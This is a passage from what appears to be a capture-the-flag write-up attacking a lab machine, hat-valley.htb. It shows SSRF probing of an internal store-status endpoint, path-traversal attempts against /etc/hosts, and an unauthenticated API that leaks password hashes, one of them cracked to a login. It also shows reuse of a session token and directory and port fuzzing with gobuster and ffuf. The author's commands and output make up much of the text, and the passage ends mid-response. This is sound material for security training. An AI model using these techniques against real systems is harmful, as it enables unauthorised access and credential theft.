</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host hat-valley.htb left intact</span>
</span></span></code></pre></td></tr></table></div></div><p>Changing the <code>url</code> query param in the above to point at my own machine, while running a basic python HTTP server locally, I see the app does indeed hit my web server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sudo</span> python -m http.server <span class=m>80</span> 
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>80</span> <span class=o>(</span>http://0.0.0.0:80/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.10.11.185 - - <span class=o>[</span>30/Jan/2023 21:41:48<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></td></tr></table></div></div><p>The web server also serves up the index.html here (that&rsquo;s an empty iframe attempting to unsuccessfully load <code>/etc/passwd</code>):</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-21-43-19-image.png data-srcset="./assets/2023-01-30-21-43-19-image.png, ./assets/2023-01-30-21-43-19-image.png 1.5x, ./assets/2023-01-30-21-43-19-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-21-43-19-image.png title=./assets/2023-01-30-21-43-19-image.png></p><p>Browsing to <a href=http://store.hat-valley.htb/ target=_blank rel="noopener noreffer">http://store.hat-valley.htb/</a> from my own machine, I get a login prompt</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-21-45-14-image.png data-srcset="./assets/2023-01-30-21-45-14-image.png, ./assets/2023-01-30-21-45-14-image.png 1.5x, ./assets/2023-01-30-21-45-14-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-21-45-14-image.png title=./assets/2023-01-30-21-45-14-image.png></p><p>I thought perhaps when retrieving the URL in the query param, maybe the server sets basic auth headers &ndash; so I tried listening on netcat and going to <a href="http://hat-valley.htb/api/store-status?url=%22http://10.10.14.17%22" target=_blank rel="noopener noreffer">http://hat-valley.htb/api/store-status?url=%22http://10.10.14.17%22</a>, hoping to capture some headers:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$sudo nc -lvnp 80
</span></span><span class=line><span class=cl>listening on [any] 80 ...
</span></span><span class=line><span class=cl>connect to [10.10.14.17] from (UNKNOWN) [10.10.11.185] 50746
</span></span><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl>Accept: application/json, text/plain, */*
</span></span><span class=line><span class=cl>User-Agent: axios/0.27.2
</span></span><span class=line><span class=cl>Host: 10.10.14.17
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>Nothing :(</p><p>Next up, I tried different Local File Inclusion techniques - <code>"../../../../etc/hosts"</code> ,<code>"file://../../../../etc/hosts"</code> and a few other variations in the query param &ndash; but just received empty 200 responses.</p><p>The dashboard page also makes a GET to <a href=http://hat-valley.htb/api/staff-details target=_blank rel="noopener noreffer">http://hat-valley.htb/api/staff-details</a>, but fails due to an invalid JWT, probably from our auth bypass by setting the cookie:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>JsonWebTokenError: jwt malformed
</span></span><span class=line><span class=cl>    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
</span></span><span class=line><span class=cl>    at /var/www/hat-valley.htb/server/server.js:151:30
</span></span><span class=line><span class=cl>    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
</span></span><span class=line><span class=cl>    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
</span></span><span class=line><span class=cl>    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
</span></span><span class=line><span class=cl>    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
</span></span><span class=line><span class=cl>    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
</span></span><span class=line><span class=cl>    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
</span></span><span class=line><span class=cl>    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
</span></span><span class=line><span class=cl>    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)
</span></span></code></pre></td></tr></table></div></div><p>I was able to &ldquo;copy as cURL&rdquo; for the staff-details request, then remove the Cookie header (no auth required!), and receive data &ndash; and it looks quite juicy!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s1>&#39;http://hat-valley.htb/api/staff-details&#39;</span> -H <span class=s1>&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0&#39;</span> -H <span class=s1>&#39;Accept: application/json, text/plain, */*&#39;</span> -H <span class=s1>&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span class=s1>&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span class=s1>&#39;Referer: http://hat-valley.htb/dashboard&#39;</span> -H <span class=s1>&#39;DNT: 1&#39;</span> -H <span class=s1>&#39;Connection: keep-alive&#39;</span> -H <span class=s1>&#39;Pragma: no-cache&#39;</span> -H <span class=s1>&#39;Cache-Control: no-cache&#39;</span> <span class=p>|</span> jq
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>   <span class=m>775</span>  <span class=m>100</span>   <span class=m>775</span>    <span class=m>0</span>     <span class=m>0</span>  <span class=m>15509</span>      <span class=m>0</span> --:--:-- --:--:-- --:--:-- <span class=m>15816</span>
</span></span><span class=line><span class=cl><span class=o>[</span>
</span></span><span class=line><span class=cl>  <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;user_id&#34;</span>: 1,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;christine.wool&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span>: <span class=s2>&#34;6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;fullname&#34;</span>: <span class=s2>&#34;Christine Wool&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span>: <span class=s2>&#34;Founder, CEO&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phone&#34;</span>: <span class=s2>&#34;0415202922&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>,
</span></span><span class=line><span class=cl>  <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;user_id&#34;</span>: 2,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;christopher.jones&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span>: <span class=s2>&#34;e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;fullname&#34;</span>: <span class=s2>&#34;Christopher Jones&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span>: <span class=s2>&#34;Salesperson&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phone&#34;</span>: <span class=s2>&#34;0456980001&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>,
</span></span><span class=line><span class=cl>  <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;user_id&#34;</span>: 3,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;jackson.lightheart&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span>: <span class=s2>&#34;b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;fullname&#34;</span>: <span class=s2>&#34;Jackson Lightheart&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span>: <span class=s2>&#34;Salesperson&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phone&#34;</span>: <span class=s2>&#34;0419444111&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>,
</span></span><span class=line><span class=cl>  <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;user_id&#34;</span>: 4,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;bean.hill&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span>: <span class=s2>&#34;37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;fullname&#34;</span>: <span class=s2>&#34;Bean Hill&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;role&#34;</span>: <span class=s2>&#34;System Administrator&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;phone&#34;</span>: <span class=s2>&#34;0432339177&#34;</span>
</span></span><span class=line><span class=cl>  <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>This time around, I thought I would enter all the hashes into crack station (because cracking in a VM is slow) &ndash; and we found a match!:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-22-06-35-image.png data-srcset="./assets/2023-01-30-22-06-35-image.png, ./assets/2023-01-30-22-06-35-image.png 1.5x, ./assets/2023-01-30-22-06-35-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-22-06-35-image.png title=./assets/2023-01-30-22-06-35-image.png></p><p>So we have user / pass pair christopher.jones / chris123, which I tried for accessing <a href=http://store.hat-valley.htb target=_blank rel="noopener noreffer">http://store.hat-valley.htb</a>. This didn&rsquo;t work, but I wiped my browser cookie, and was able to log back in to the main HR dashboard web app using these credentials:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-30-22-09-21-image.png data-srcset="./assets/2023-01-30-22-09-21-image.png, ./assets/2023-01-30-22-09-21-image.png 1.5x, ./assets/2023-01-30-22-09-21-image.png 2x" data-sizes=auto alt=./assets/2023-01-30-22-09-21-image.png title=./assets/2023-01-30-22-09-21-image.png></p><p>We also have a leave request form that appears to detect basic XSS:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-31-21-11-23-image.png data-srcset="./assets/2023-01-31-21-11-23-image.png, ./assets/2023-01-31-21-11-23-image.png 1.5x, ./assets/2023-01-31-21-11-23-image.png 2x" data-sizes=auto alt=./assets/2023-01-31-21-11-23-image.png title=./assets/2023-01-31-21-11-23-image.png></p><p>We can see in developer tools, the leave request history is populated from <a href=http://hat-valley.htb/api/all-leave target=_blank rel="noopener noreffer">http://hat-valley.htb/api/all-leave</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -s <span class=s1>&#39;http://hat-valley.htb/api/all-leave&#39;</span> -H <span class=s1>&#39;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MDc2OTEwfQ.GflAx7TisfVXN3hW3W5-Aryd5Smhoo3y1rh3DpGq5QY&#39;</span>
</span></span><span class=line><span class=cl>christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
</span></span><span class=line><span class=cl>christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
</span></span></code></pre></td></tr></table></div></div><p>I tried entering a leave reason with commas, which is accepted input, and this seems to screw up fields:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -s <span class=s1>&#39;http://hat-valley.htb/api/all-leave&#39;</span> -H <span class=s1>&#39;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MDc2OTEwfQ.GflAx7TisfVXN3hW3W5-Aryd5Smhoo3y1rh3DpGq5QY&#39;</span>
</span></span><span class=line><span class=cl>christopher.jones,,foo,bar,25/01/2023,02/02/2023,Pending
</span></span></code></pre></td></tr></table></div></div><p>I finally decided to run <a href=http://store.hat-valley.htb target=_blank rel="noopener noreffer">http://store.hat-valley.htb</a> through gobuster to find other URL paths:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u http://store.hat-valley.htb -w /usr/share/wordlists/dirb/common.txt 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://store.hat-valley.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/01/31 22:44:55 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/admin.php            <span class=o>(</span>Status: 401<span class=o>)</span> <span class=o>[</span>Size: 188<span class=o>]</span>
</span></span><span class=line><span class=cl>/cart                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://store.hat-valley.htb/cart/<span class=o>]</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://store.hat-valley.htb/css/<span class=o>]</span> 
</span></span><span class=line><span class=cl>/fonts                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://store.hat-valley.htb/fonts/<span class=o>]</span>
</span></span><span class=line><span class=cl>/img                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://store.hat-valley.htb/img/<span class=o>]</span>  
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 401<span class=o>)</span> <span class=o>[</span>Size: 188<span class=o>]</span>                                         
</span></span><span class=line><span class=cl>/info.php             <span class=o>(</span>Status: 401<span class=o>)</span> <span class=o>[</span>Size: 188<span class=o>]</span>                                         
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://store.hat-valley.htb/js/<span class=o>]</span>   
</span></span><span class=line><span class=cl>/phpinfo.php          <span class=o>(</span>Status: 401<span class=o>)</span> <span class=o>[</span>Size: 188<span class=o>]</span>                                         
</span></span><span class=line><span class=cl>/static               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://store.hat-valley.htb/static/<span class=o>]</span>
</span></span><span class=line><span class=cl>/xmlrpc.php           <span class=o>(</span>Status: 401<span class=o>)</span> <span class=o>[</span>Size: 188<span class=o>]</span>                                          
</span></span><span class=line><span class=cl>/xmlrpc_server.php    <span class=o>(</span>Status: 401<span class=o>)</span> <span class=o>[</span>Size: 188<span class=o>]</span>         
</span></span></code></pre></td></tr></table></div></div><p>I tried Server Side Request Forgery (SSRF) with the URLs above, and for <a href=http://hat-valley.htb target=_blank rel="noopener noreffer">http://hat-valley.htb</a> (including <code>/api/all-leave</code>, <code>/api/login</code>) via <a href="http://hat-valley.htb/api/store-status?url=%22URL%22" target=_blank rel="noopener noreffer">http://hat-valley.htb/api/store-status?url="URL"</a>, and each time would get a 200 response. I noticed in the webpack file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>WEBPACK_IMPORTED_MODULE_2__[&#34;default&#34;]
</span></span><span class=line><span class=cl>    .store_status(&#34;http://store.hat-valley.htb&#34;)
</span></span><span class=line><span class=cl>    .then(function (data) {
</span></span><span class=line><span class=cl>        if (data.length &gt; 0) {
</span></span><span class=line><span class=cl>            _this.status = &#34;Up&#34;;
</span></span><span class=line><span class=cl>            _this.color = &#34;green&#34;
</span></span><span class=line><span class=cl>        } else {
</span></span><span class=line><span class=cl>            _this.status = &#34;Down&#34;;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    })
</span></span></code></pre></td></tr></table></div></div><p>So an empty 200 response when we attempt SSRF probably means the URL was unreachable if the body is empty. I was able to validate this by running a web server locally and hitting <a href="http://hat-valley.htb/api/store-status?url=htt://10.10.14.48" target=_blank rel="noopener noreffer">http://hat-valley.htb/api/store-status?url=htt://10.10.14.48</a> . The response would contain the body of the index file I served up (as per above).</p><p>I thought perhaps serving up a PHP or Node file might allow RCE if the server executes the file as part of rendering to the browser, but this didn&rsquo;t work &ndash; just the file contents were returned &ndash; no parsing and interpreting :(</p><p>I ran <code>ffuf</code> to enumerate local endpoints, but filter out 0 byte responses &ndash; and similar for store.hat-valley.htb, but did not find anything:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u <span class=s2>&#34;http://hat-valley.htb/api/store-status?url=%22http:%2F%2F127.0.0.1/FUZZ%22&#34;</span> -w /usr/share/dirb/wordlists/common.txt -fs <span class=m>0</span>
</span></span><span class=line><span class=cl>                        <span class=o>[</span>Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 172ms<span class=o>]</span>
</span></span><span class=line><span class=cl>index.html              <span class=o>[</span>Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 64ms<span class=o>]</span>
</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>4614/4614<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>391</span> req/sec :: Duration: <span class=o>[</span>0:00:16<span class=o>]</span> :: Er
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$ffuf</span> -u <span class=s2>&#34;http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb/FUZZ%22&#34;</span> -w /usr/share/dirb/wordlists/common.txt -fs <span class=m>0</span>
</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>4614/4614<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>357</span> req/sec :: Duration: <span class=o>[</span>0:00:22<span class=o>]</span> :: Errors: <span class=m>0</span> ::
</span></span></code></pre></td></tr></table></div></div><p>Given we already know we&rsquo;re dealing with a dev server, we can try fuzzing the port to see if the store is running on a different port which perhaps explains why it&rsquo;s showing as &lsquo;down&rsquo; &ndash; so we create a text file of all ports 1-65535 by running <code>(seq 1 65535) > ports.txt</code>, and we fuzz the port in the URL using this newly created file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ffuf</span> -u <span class=s2>&#34;http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:FUZZ/%22&#34;</span> -w ports.txt -fs <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>3002</span>                    <span class=o>[</span>Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 194ms<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=m>8080</span>                    <span class=o>[</span>Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 513ms<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s check out port 8080:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -v <span class=s1>&#39;http://hat-valley.htb/api/store-status?url=%22http:%2F%2Fstore.hat-valley.htb:8080%22&#39;</span> -H <span class=s1>&#39;Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MjQyNzMzfQ.baG3nt6GCFrvWeuSbXrYaEfxpYatAw-Rx9IUTiIH5n8&#39;</span>
</span></span><span class=line><span class=cl>*   Trying 10.10.11.185:80...
</span></span><span class=line><span class=cl>* Connected to hat-valley.htb <span class=o>(</span>10.10.11.185<span class=o>)</span> port <span class=m>80</span> <span class=o>(</span><span class=c1>#0)</span>
</span></span><span class=line><span class=cl>&gt; GET /api/store-status?url<span class=o>=</span>%22http:%2F%2Fstore.hat-valley.htb:8080%22 HTTP/1.1
</span></span><span class=line><span class=cl>&gt; Host: hat-valley.htb
</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.87.0
</span></span><span class=line><span class=cl>&gt; Accept: */*
</span></span><span class=line><span class=cl>&gt; Cookie: <span class=nv>token</span><span class=o>=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc1MjQyNzMzfQ.baG3nt6GCFrvWeuSbXrYaEfxpYatAw-Rx9IUTiIH5n8
</span></span><span class=line><span class=cl>&gt; 
</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>&lt; Server: nginx/1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>&lt; Date: Wed, <span class=m>01</span> Feb <span class=m>2023</span> 09:34:28 GMT
</span></span><span class=line><span class=cl>&lt; Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>2881</span>
</span></span><span class=line><span class=cl>&lt; Connection: keep-alive
</span></span><span class=line><span class=cl>&lt; x-powered-by: Express
</span></span><span class=line><span class=cl>&lt; access-control-allow-origin: *
</span></span><span class=line><span class=cl>&lt; etag: W/<span class=s2>&#34;b41-tn8t3x3qcvcm126OQ/i0AXwBj8M&#34;</span>
</span></span><span class=line><span class=cl>&lt; 
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html <span class=nv>lang</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;
</span></span><span class=line><span class=cl>  &lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;meta <span class=nv>charset</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span>&gt;
